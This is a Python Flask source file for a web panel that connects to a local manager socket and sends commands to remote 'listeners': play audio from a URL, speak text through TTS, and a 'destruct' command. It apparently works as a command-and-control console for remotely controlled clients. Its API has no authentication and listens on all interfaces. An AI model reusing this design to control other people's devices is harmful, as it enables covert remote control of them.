import socket
import json
import os
import time
import threading
import queue
from datetime import datetime
from flask import Flask, render_template, request, jsonify, Response
from dotenv import load_dotenv

load_dotenv()

HOST = "localhost"
PORT = 7833
API_KEY = os.getenv("API_KEY")

app = Flask(__name__)

available_listeners = {}
listeners_lock = threading.Lock()
current_target = None
target_lock = threading.Lock()
sock = None
sock_lock = threading.Lock()
action_history = []
history_lock = threading.Lock()
manager_connected = False

sse_clients = []
sse_lock = threading.Lock()


def push_event(data):
    with sse_lock:
        for q in list(sse_clients):
            try:
                q.put_nowait(data)
            except Exception:
                pass


def add_history(action_type, params, target):
    entry = {
        "id": int(time.time() * 1000),
        "time": datetime.now().strftime("%H:%M:%S"),
        "type": action_type,
        "params": params,
        "target": target,
    }
    with history_lock:
        action_history.insert(0, entry)
        if len(action_history) > 200:
            action_history.pop()
    push_event({"event": "history_entry", "entry": entry})


def handle_event(msg):
    global current_target
    event = msg.get("event")

    if event == "listeners":
        available = msg.get("available", {})
        with listeners_lock:
            available_listeners.clear()
            available_listeners.update(available)
        with target_lock:
            if current_target is None and available:
                current_target = next(iter(available))
            t = current_target
        push_event({
            "event": "listeners_update",
            "listeners": dict(available_listeners),
            "current": t,
        })

    elif event == "listener_connected":
        lid = msg.get("id")
        addr = msg.get("addr", "?")
        with listeners_lock:
            available_listeners[lid] = addr
        with target_lock:
            if current_target is None:
                current_target = lid
            t = current_target
        push_event({
            "event": "listener_connected",
            "id": lid,
            "addr": addr,
            "listeners": dict(available_listeners),
            "current": t,
        })

    elif event == "listener_disconnected":
        lid = msg.get("id")
        with listeners_lock:
            available_listeners.pop(lid, None)
            fallback = next(iter(available_listeners), None)
        with target_lock:
            if current_target == lid:
                current_target = fallback
            t = current_target
        push_event({
            "event": "listener_disconnected",
            "id": lid,
            "listeners": dict(available_listeners),
            "current": t,
        })


def handle_response(msg):
    from_id = msg.get("from", "")
    t = msg.get("type", "?")
    stage = msg.get("stage", "?")
    body = msg.get("msg") or ""
    push_event({
        "event": "response",
        "from": from_id,
        "rtype": t,
        "stage": stage,
        "msg": body,
        "time": datetime.now().strftime("%H:%M:%S"),
    })


def recv_loop(s):
    buf = ""
    try:
        while True:
            data = s.recv(4096)
            if not data:
                break
            buf += data.decode(errors="ignore")
            while "\n" in buf:
                line, buf = buf.split("\n", 1)
                line = line.strip()
                if not line:
                    continue
                try:
                    msg = json.loads(line)
                    if "event" in msg:
                        handle_event(msg)
                    else:
                        handle_response(msg)
                except Exception:
                    push_event({"event": "raw", "data": line, "time": datetime.now().strftime("%H:%M:%S")})
    except Exception:
        pass
    finally:
        global manager_connected
        manager_connected = False
        push_event({"event": "manager_disconnected"})
        time.sleep(3)
        threading.Thread(target=connect_manager, daemon=True).start()


def connect_manager():
    global sock, manager_connected, current_target
    push_event({"event": "manager_connecting"})
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            s.sendall(b"role=controller\n")
            with sock_lock:
                sock = s
            manager_connected = True
            push_event({"event": "manager_connected"})
            threading.Thread(target=recv_loop, args=(s,), daemon=True).start()
            return
        except Exception:
            push_event({"event": "manager_connecting"})
            time.sleep(3)


def send_packet(packet):
    with target_lock:
        t = current_target
    if t:
        packet["target"] = t
    with sock_lock:
        s = sock
    if s:
        try:
            s.sendall((json.dumps(packet) + "\n").encode("utf-8"))
        except Exception:
            pass
    return t



@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/state")
def state():
    with listeners_lock:
        ls = dict(available_listeners)
    with target_lock:
        t = current_target
    with history_lock:
        h = list(action_history[:50])
    return jsonify({
        "listeners": ls,
        "current_target": t,
        "history": h,
        "manager_connected": manager_connected,
    })


@app.route("/api/audio", methods=["POST"])
def audio():
    url = (request.json or {}).get("url", "").strip()
    if not url:
        return jsonify({"error": "URL vacía"}), 400
    target = send_packet({"type": 1, "url": url})
    add_history("audio", {"url": url}, target)
    return jsonify({"ok": True, "target": target})


@app.route("/api/tts", methods=["POST"])
def tts():
    txt = (request.json or {}).get("txt", "").strip()
    if not txt:
        return jsonify({"error": "Mensaje vacío"}), 400
    target = send_packet({"type": 2, "txt": txt, "api_key": API_KEY})
    add_history("tts", {"txt": txt}, target)
    return jsonify({"ok": True, "target": target})


@app.route("/api/destruct", methods=["POST"])
def destruct():
    target = send_packet({"type": 404})
    add_history("destruct", {}, target)
    return jsonify({"ok": True, "target": target})


@app.route("/api/switch", methods=["POST"])
def switch():
    global current_target
    lid = (request.json or {}).get("id", "").strip()
    with listeners_lock:
        ls = dict(available_listeners)
    if lid not in ls:
        return jsonify({"error": "Listener desconocido"}), 400
    with target_lock:
        current_target = lid
    push_event({"event": "target_changed", "current": lid})
    return jsonify({"ok": True, "current": lid})



@app.route("/stream")
def stream():
    q = queue.Queue(maxsize=100)
    with sse_lock:
        sse_clients.append(q)

    def generate():

        with listeners_lock:
            ls = dict(available_listeners)
        with target_lock:
            t = current_target
        yield f"data: {json.dumps({'event': 'init', 'listeners': ls, 'current': t, 'manager_connected': manager_connected})}\n\n"

        try:
            while True:
                try:
                    data = q.get(timeout=25)
                    yield f"data: {json.dumps(data)}\n\n"
                except queue.Empty:
                    yield "data: {\"event\":\"ping\"}\n\n"
        except GeneratorExit:
            pass
        finally:
            with sse_lock:
                try:
                    sse_clients.remove(q)
                except ValueError:
                    pass

    return Response(
        generate(),
        mimetype="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


if __name__ == "__main__":
    threading.Thread(target=connect_manager, daemon=True).start()
    app.run(host="0.0.0.0", port=5555, debug=False, threaded=True)
